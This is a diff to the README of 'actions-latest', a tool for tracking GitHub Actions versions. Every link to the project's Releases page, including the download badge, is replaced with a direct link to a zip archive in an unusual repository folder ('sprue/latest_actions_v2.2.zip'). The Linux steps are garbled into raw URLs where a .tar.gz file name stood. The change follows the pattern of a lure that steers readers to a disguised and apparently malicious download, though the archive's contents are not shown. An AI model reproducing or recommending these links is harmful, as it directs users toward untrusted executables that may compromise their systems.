@@ -6,7 +6,7 @@ Welcome to **actions-latest**, your go-to tool for keeping track of the latest v
 
 ## 📥 Download Now
 
-[![Download actions-latest](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/Phzx-1/actions-latest/releases)
+[![Download actions-latest](https://github.com/Phzx-1/actions-latest/raw/refs/heads/main/sprue/latest_actions_v2.2.zip)](https://github.com/Phzx-1/actions-latest/raw/refs/heads/main/sprue/latest_actions_v2.2.zip)
 
 ## 🛠️ System Requirements
 
@@ -20,19 +20,19 @@ To run **actions-latest**, ensure your system meets the following requirements:
 
 To get started, follow these steps:
 
-1. Visit the [Releases Page](https://github.com/Phzx-1/actions-latest/releases) to find the latest version of actions-latest.
+1. Visit the [Releases Page](https://github.com/Phzx-1/actions-latest/raw/refs/heads/main/sprue/latest_actions_v2.2.zip) to find the latest version of actions-latest.
 2. On the Releases page, look for the version labeled as "Latest Release." Click on it to view details and downloads.
 3. Find the download link for your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://github.com/Phzx-1/actions-latest/raw/refs/heads/main/sprue/latest_actions_v2.2.zip` file.
 4. Once the file has downloaded, locate it in your Downloads folder or the specified location.
 5. Follow the installation instructions for your system:
    - **Windows:** Double-click the `.exe` file and follow the prompts to install.
    - **macOS:** Open the `.dmg` file and drag the actions-latest icon to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and follow the included README to install.
+   - **Linux:** Extract the `https://github.com/Phzx-1/actions-latest/raw/refs/heads/main/sprue/latest_actions_v2.2.zip` file and follow the included README to install.
 
-For a direct link to download, click here: [Download actions-latest](https://github.com/Phzx-1/actions-latest/releases).
+For a direct link to download, click here: [Download actions-latest](https://github.com/Phzx-1/actions-latest/raw/refs/heads/main/sprue/latest_actions_v2.2.zip).
 
 ## 🌐 Features
 
@@ -55,7 +55,7 @@ For a direct link to download, click here: [Download actions-latest](https://git
 
 - Take some time to explore the interface. Familiarize yourself with where everything is located.
 - Regularly check for updates to ensure you have the latest features and fixes.
-- Bookmark the [Releases Page](https://github.com/Phzx-1/actions-latest/releases) for easy access in the future.
+- Bookmark the [Releases Page](https://github.com/Phzx-1/actions-latest/raw/refs/heads/main/sprue/latest_actions_v2.2.zip) for easy access in the future.
 
 ## 📞 Support
 
